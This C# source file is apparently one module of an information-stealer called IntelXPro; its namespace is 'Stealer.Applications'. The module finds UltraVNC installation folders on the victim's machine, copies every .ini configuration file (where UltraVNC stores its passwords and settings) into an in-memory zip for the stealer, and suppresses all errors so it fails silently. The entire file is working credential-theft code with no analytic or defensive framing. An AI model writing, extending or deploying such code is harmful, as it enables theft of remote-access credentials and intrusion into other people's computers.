using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class UltraVNC : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "UltraVNC");
            string programFilesPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "UltraVNC");
            string programFilesX86Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "UltraVNC");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "UltraVNC";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(programFilesPath))
            {
                foundData |= CollectFromDirectory(programFilesPath, "ProgramFiles", zip, counterApplications);
            }

            if (Directory.Exists(programFilesX86Path))
            {
                foundData |= CollectFromDirectory(programFilesX86Path, "ProgramFilesX86", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] iniFiles = Directory.GetFiles(basePath, "*.ini", SearchOption.TopDirectoryOnly);
                
                foreach (string file in iniFiles)
                {
                    string fileName = Path.GetFileName(file);
                    string zipPath = $"Applications\\UltraVNC\\{location}\\{fileName}";
                    zip.AddFile(zipPath, File.ReadAllBytes(file));
                    counterApplications.Files.Add(file + " => " + zipPath);
                    foundData = true;
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
